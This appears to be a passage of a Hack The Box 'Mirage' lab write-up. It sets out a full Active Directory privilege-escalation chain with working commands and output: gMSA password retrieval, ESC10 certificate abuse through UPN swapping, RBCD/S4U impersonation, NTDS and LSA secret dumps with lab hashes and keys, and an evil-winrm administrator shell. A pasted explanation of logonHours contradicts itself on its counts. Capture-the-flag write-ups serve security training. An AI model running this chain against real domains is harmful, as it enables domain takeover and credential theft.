[-] ['ACCOUNTDISABLE'] property flags removed from JAVIER.MMARSHALL's userAccountControl
```

Besides that, we also need to change the attribute of `logonHours:`
```
logonHours: //////////////////////////// means the user is allowed to log on at any time, 24/7 — every hour of every day.

🔍 Explanation:
The logonHours attribute in Active Directory is a 21-byte bitmask.

Each bit represents one hour of the week.

A week has 168 hours (7 days × 24 hours) → 168 bits → 21 bytes.

Each byte is 8 hours.

A / in this representation is a printable substitute for the binary byte 0xFF → 11111111 in bits.

////////////////////////// is 24 slashes, i.e. 24 × 8 = 192 bits, which is more than 168, so likely just a visual over-representation.

✅ Meaning:
Each / = all 8 hours of that byte are set to 1 → allowed login.

So:
////////////////////////// = All hours allowed → user can log in at any hour, any day.

If you want to restrict logon hours, you'd need to set specific bits to 0 (for deny) and 1 (for allow) across the 21 bytes.

Let me know if you'd like help generating a restricted logonHours bitmask (e.g., only 9AM–5PM Monday–Friday).
```

In this place, I have tried to use `bloodyAD`, but I still don't find a valid command (If you can, please contact me and message me)

So I would use a `ldap3` script to change that
```
from ldap3 import Server, Connection, SASL, GSSAPI, MODIFY_REPLACE
import os

os.environ["KRB5CCNAME"] = "./mark.bbond.ccache"

server = Server("dc01.mirage.htb", get_info=None)
conn = Connection(server, authentication=SASL, sasl_mechanism=GSSAPI)
conn.bind()

dn = "CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb"
logon_hours_hex = "FF" * 21
logon_hours_bytes = bytes.fromhex(logon_hours_hex)

conn.modify(dn, {"logonHours": [(MODIFY_REPLACE, [logon_hours_bytes])]})
print(conn.result)
```

After you run the script, you can find something changed
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ python3 change.py
{'result': 0, 'description': 'success', 'dn': '', 'message': '', 'referrals': None, 'type': 'modifyResponse'}
```
![](images/Pasted%20image%2020250721114537.png)

Then let's try again to get the `msDS-ManagedPassword` object:
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ bloodyAD -k --host dc01.mirage.htb -d 'mirage.htb' -u 'javier.mmarshall' -p 'Abc123456@' get object 'Mirage-Service$' --attr msDS-ManagedPassword

distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866
msDS-ManagedPassword.B64ENCODED: 43A01mr7V2LGukxowctrHCsLubtNUHxw2zYf7l0REqmep3mfMpizCXlvhv0n8SFG/WKSApJsujGp2+unu/xA6F2fLD4H5Oji/mVHYkkf+iwXjf6Z9TbzVkLGELgt/k2PI4rIz600cfYmFq99AN8ZJ9VZQEqRcmQoaRqi51nSfaNRuOVR79CGl/QQcOJv8eV11UgfjwPtx3lHp1cXHIy4UBQu9O0O5W0Qft82GuB3/M7dTM/YiOxkObGdzWweR2k/J+xvj8dsio9QfPb9QxOE18n/ssnlSxEI8BhE7fBliyLGN7x/pw7lqD/dJNzJqZEmBLLVRUbhprzmG29yNSSjog==

```

Then we can get the TGT ticket of `Mirage-Services`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ impacket-getTGT mirage.htb/Mirage-Service\$ -hashes :305806d84f7c1be93a07aaf40f0c7866

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Mirage-Service$.ccache
                                                                                     
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ export KRB5CCNAME=Mirage-Service\$.ccache 
```

# ESC10 exploit:
I have tried to  use `certipy-ad` to find the vulnerable exploit here.
```
certipy-ad find \
  -u 'mark.bbond@mirage.htb' \
  -k -no-pass \
  -dc-ip 10.10.11.78 \
  -target dc01.mirage.htb \
  -vulnerable
```
But nothing vulnerable is listed from that.

Let's continue to check the writable `ACL` attributes lists
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ bloodyAD --host dc01.mirage.htb --dc-ip 10.10.11.78 -d mirage.htb -k get writable --otype USER --right WRITE --detail                            

distinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
manager: WRITE
mail: WRITE
msDS-HABSeniorityIndex: WRITE
msDS-PhoneticDisplayName: WRITE
msDS-PhoneticCompanyName: WRITE
msDS-PhoneticDepartment: WRITE
msDS-PhoneticLastName: WRITE
msDS-PhoneticFirstName: WRITE
msDS-SourceObjectDN: WRITE
msDS-AllowedToDelegateTo: WRITE
altSecurityIdentities: WRITE
servicePrincipalName: WRITE
userPrincipalName: WRITE
legacyExchangeDN: WRITE
otherMailbox: WRITE
showInAddressBook: WRITE
systemFlags: WRITE
division: WRITE
objectGUID: WRITE
name: WRITE
displayNamePrintable: WRITE
proxyAddresses: WRITE
company: WRITE
department: WRITE
co: WRITE
dn: WRITE
initials: WRITE
givenName: WRITE
description: WRITE
title: WRITE
ou: WRITE
o: WRITE
sn: WRITE
objectCategory: WRITE
cn: WRITE
objectClass: WRITE
```
We can found some hints about `ESC10` abuse
```
altSecurityIdentities: WRITE
This is the core condition of ESC10 abuse.

ESC10 in brief:
If an attacker has write permission to the altSecurityIdentities attribute of a user object, he can inject arbitrary certificate mapping information (such as: X509:<I>CN=CA...<S>CN=SomeUser) into the attribute, allowing the attacker to use a forged client certificate to impersonate the user for Kerberos PKINIT authentication.
```

Then let's check the detail of exploit:
`https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication`
Please follow this link to exploit step by step
**Check the `ESC10 case1 or case2`**
```
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL'

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL
    EventLogging    REG_DWORD    0x1
    CertificateMappingMethods    REG_DWORD    0x4

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CipherSuites
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Hashes
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\KeyExchangeAlgorithms
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols
```
Look for `ESC10` after `Mirage-Service$` because the service account had permissions to modify event subscriptions, enabling privilege escalation via Event Subscription abuse.
![](images/Pasted%20image%2020250720181332.png)

**Step 1: UPN Manipulation**
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ export KRB5CCNAME=Mirage-Service\$.ccache

                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ certipy-ad account update \
  -user 'mark.bbond' \
  -upn 'dc01$@mirage.htb' \
  -u 'mirage-service$@mirage.htb' \
  -k -no-pass \
  -dc-ip 10.10.11.78 \
  -target dc01.mirage.htb

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : dc01$@mirage.htb
[*] Successfully updated 'mark.bbond'
```

**Step 2: Certificate Enrollment**
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ export KRB5CCNAME=mark.bbond.ccache      
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ certipy-ad req \
  -u 'mark.bbond@mirage.htb' \
  -k -no-pass \
  -dc-ip 10.10.11.78 \
  -target 'dc01.mirage.htb' \
  -ca 'mirage-DC01-CA' \
  -template 'User'

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with UPN 'dc01$@mirage.htb'
[*] Certificate object SID is 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Saving certificate and private key to 'dc01.pfx'
[*] Wrote certificate and private key to 'dc01.pfx'
```

**Step 3: UPN Reversion:**
```
export KRB5CCNAME=Mirage-Service\$.ccache
certipy-ad account update \
  -user 'mark.bbond' \
  -upn 'mark.bbond@mirage.htb' \
  -u 'mirage-service$@mirage.htb' \
  -k -no-pass \
  -dc-ip 10.10.11.78 \
  -target dc01.mirage.htb
```

**Step 4: Schannel Authentication & Impersonation**
Then in the `ldap-shell`, we can grant user `rbcd` privileges, but cannot create users and hosts
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ certipy-ad auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'dc01$@mirage.htb'
[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Connecting to 'ldaps://10.10.11.78:636'
[*] Authenticated to '10.10.11.78' as: 'u:MIRAGE\\DC01$'
Type help for list of commands

# set_rbcd dc01$ Mirage-Service$
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000

Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
Delegation rights modified successfully!
Mirage-Service$ can now impersonate users on dc01$ via S4U2Proxy

# 
```

Then we can `getST` of administrator
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ impacket-getST -spn 'cifs/DC01.mirage.htb' -impersonate 'dc01$' -dc-ip 10.10.11.78  'mirage.htb/Mirage-Service$' -hashes :305806d84f7c1be93a07aaf40f0c7866
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating dc01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@cifs_DC01.mirage.htb@MIRAGE.HTB.ccache

┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ export KRB5CCNAME='dc01$@cifs_DC01.mirage.htb@MIRAGE.HTB.ccache'

```

Finally we can dump all the hashes of users:
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ nxc smb dc01.mirage.htb -k --use-kcache --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] y
SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\dc01$ from ccache 
SMB         dc01.mirage.htb 445    dc01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         dc01.mirage.htb 445    dc01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc01.mirage.htb 445    dc01             mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
SMB         dc01.mirage.htb 445    dc01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         dc01.mirage.htb 445    dc01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
SMB         dc01.mirage.htb 445    dc01             mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
SMB         dc01.mirage.htb 445    dc01             mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
SMB         dc01.mirage.htb 445    dc01             mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
SMB         dc01.mirage.htb 445    dc01             mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:694fba7016ea1abd4f36d188b3983d84:::
SMB         dc01.mirage.htb 445    dc01             mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
SMB         dc01.mirage.htb 445    dc01             mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
SMB         dc01.mirage.htb 445    dc01             mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
SMB         dc01.mirage.htb 445    dc01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
SMB         dc01.mirage.htb 445    dc01             Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866:::
SMB         dc01.mirage.htb 445    dc01             [+] Dumped 12 NTDS hashes to /home/wither/.nxc/logs/ntds/dc01_dc01.mirage.htb_2025-07-20_173435.ntds of which 10 were added to the database
SMB         dc01.mirage.htb 445    dc01             [*] To extract only enabled accounts from the output file, run the following command: 
SMB         dc01.mirage.htb 445    dc01             [*] cat /home/wither/.nxc/logs/ntds/dc01_dc01.mirage.htb_2025-07-20_173435.ntds | grep -iv disabled | cut -d ':' -f1
SMB         dc01.mirage.htb 445    dc01             [*] grep -iv disabled /home/wither/.nxc/logs/ntds/dc01_dc01.mirage.htb_2025-07-20_173435.ntds | cut -d ':' -f1

```

Then let's get the `TGT` ticket first and connect to machine by `evil-winrm`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ impacket-getTGT mirage.htb/Administrator -hashes :7be6d4f3c2b9c0e3560f5a29eeb1afb3 -dc-ip 10.10.11.78

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
                                                                                                                                                                                

┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ evil-winrm -i dc01.mirage.htb -r mirage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```


All the dumped hashes:
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ impacket-secretsdump -k -no-pass mirage.htb/Administrator@dc01.mirage.htb -dc-ip 10.10.11.78

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x73af13e1bd19973fc6b69f4856f8e408
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:084d93d7a57d7755208a400acfe12e89:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
MIRAGE\DC01$:plain_password_hex:fed165506eaed8b31f6f2d79b1a40607277a7d1d8c1f7ea689f3b4776c6843d5b2dbf8944f1b4f8b24b3307f80086dfc3676131f1afdce3e4d3eecfd67f6db930857efd7bd00ec3735397ace0d5e73950bbce86eb91d037a621113830e3c615069c4794d474c611d34eaf1ad47d81fd22a85007940f74844e3b9104bc4af345605f811a02722d6dd4e373c1dc3af4b2c2e7009b48c809fa0472013bb6f6e2809262f944b24233f7d7f8e3b455274c67d2bfb31ea368ea6c67a045f7766bfc8032a8bc1fe82f7c96ebf82f2013079b24764368d2336b50fa49d2c6b7bb40331f6d819d0d478203f751e21de27bde535ae
MIRAGE\DC01$:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
[*] DefaultPassword 
MIRAGE\mark.bbond:3r2o90s5EZ@_@1!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x81b917dff7583fb28798b080ed6a37279cd60414
dpapi_userkey:0x0cc937b6c3553e3b33ded0dc365acc65adbedf46
[*] NL$KM 
 0000   62 AA C6 71 CE 27 AC D1  E8 65 D7 DF C7 A3 86 77   b..q.'...e.....w
 0010   8B 3A 6F 90 B3 B0 8B 73  A5 BA 26 C1 55 C0 EF 3B   .:o....s..&.U..;
 0020   37 C1 64 D7 0A DA AF 83  60 AD 6B EF A0 27 2F 9D   7.d.....`.k..'/.
 0030   C7 DB 77 77 D4 1B AF 39  61 2D 4E AE C4 BC C3 BB   ..ww...9a-N.....
NL$KM:62aac671ce27acd1e865d7dfc7a386778b3a6f90b3b08b73a5ba26c155c0ef3b37c164d70adaaf8360ad6befa0272f9dc7db7777d41baf39612d4eaec4bcc3bb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:694fba7016ea1abd4f36d188b3983d84:::
mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866:::
[*] Kerberos keys grabbed
mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa211293070bce0a567c0e08da5406ad0bce4bdca7
mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07
mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619
krbtgt:aes256-cts-hmac-sha1-96:95f7af8ea1bae174de9666c99a9b9edeac0ca15e70c7246cab3f83047c059603
krbtgt:aes128-cts-hmac-sha1-96:6f790222a7ee5ba9d2776f6ee71d1bfb
krbtgt:des-cbc-md5:8cd65e54d343ba25
mirage.htb\Dev_Account_A:aes256-cts-hmac-sha1-96:e4a6658ff9ee0d2a097864d6e89218287691bf905680e0078a8e41498f33fd9a
mirage.htb\Dev_Account_A:aes128-cts-hmac-sha1-96:ceee67c4feca95b946e78d89cb8b4c15
mirage.htb\Dev_Account_A:des-cbc-md5:26dce5389b921a52
mirage.htb\Dev_Account_B:aes256-cts-hmac-sha1-96:5c320d4bef414f6a202523adfe2ef75526ff4fc6f943aaa0833a50d102f7a95d
mirage.htb\Dev_Account_B:aes128-cts-hmac-sha1-96:e05bdceb6b470755cd01fab2f526b6c0
mirage.htb\Dev_Account_B:des-cbc-md5:e5d07f57e926ecda
mirage.htb\david.jjackson:aes256-cts-hmac-sha1-96:3480514043b05841ecf08dfbf33d81d361e51a6d03ff0c3f6d51bfec7f09dbdb
mirage.htb\david.jjackson:aes128-cts-hmac-sha1-96:bd841caf9cd85366d254cd855e61cd5e
mirage.htb\david.jjackson:des-cbc-md5:76ef68d529459bbc
mirage.htb\javier.mmarshall:aes256-cts-hmac-sha1-96:20acfd56be43c1123b3428afa66bb504a9b32d87c3269277e6c917bf0e425502
mirage.htb\javier.mmarshall:aes128-cts-hmac-sha1-96:9d2fc7611e15be6fe16538ebb3b2ad6a
mirage.htb\javier.mmarshall:des-cbc-md5:6b3d51897fdc3237
mirage.htb\mark.bbond:aes256-cts-hmac-sha1-96:dc423caaf884bb869368859c59779a757ff38a88bdf4197a4a284b599531cd27
mirage.htb\mark.bbond:aes128-cts-hmac-sha1-96:78fcb9736fbafe245c7b52e72339165d
mirage.htb\mark.bbond:des-cbc-md5:d929fb462ae361a7
mirage.htb\nathan.aadam:aes256-cts-hmac-sha1-96:b536033ac796c7047bcfd47c94e315aea1576a97ff371e2be2e0250cce64375b
mirage.htb\nathan.aadam:aes128-cts-hmac-sha1-96:b1097eb42fd74827c6d8102a657e28ff
mirage.htb\nathan.aadam:des-cbc-md5:5137a74f40f483c7
mirage.htb\svc_mirage:aes256-cts-hmac-sha1-96:937efa5352253096b3b2e1d31a9f378f422d9e357a5d4b3af0d260ba1320ba5e
mirage.htb\svc_mirage:aes128-cts-hmac-sha1-96:8d382d597b707379a254c60b85574ab1
mirage.htb\svc_mirage:des-cbc-md5:2f13c12f9d5d6708
DC01$:aes256-cts-hmac-sha1-96:4a85665cd877c7b5179c508e5bc4bad63eafe514f7cedb0543930431ef1e422b
DC01$:aes128-cts-hmac-sha1-96:94aa2a6d9e156b7e8c03a9aad4af2cc1
DC01$:des-cbc-md5:cb19ce2c733b3ba8
Mirage-Service$:aes256-cts-hmac-sha1-96:80bada65a4f84fb9006013e332105db15ac6f07cb9987705e462d9491c0482ae
Mirage-Service$:aes128-cts-hmac-sha1-96:ff1d75e3a88082f3dffbb2b8e3ff17dd
Mirage-Service$:des-cbc-md5:c42ffd455b91f208
```

`Walkup` password : `7be6d4f3c2b9c0e3560f5a29eeb1afb3`

# Description

As expected of another legendary AD domain machine by the author of Dark Corp, it is very challenging and crazy. Although it is rated as hard difficulty, I think it can be considered insane, especially the part of privilege escalation, which is full of rabbit holes. You have to try one by one and ensure the correct cache is exported.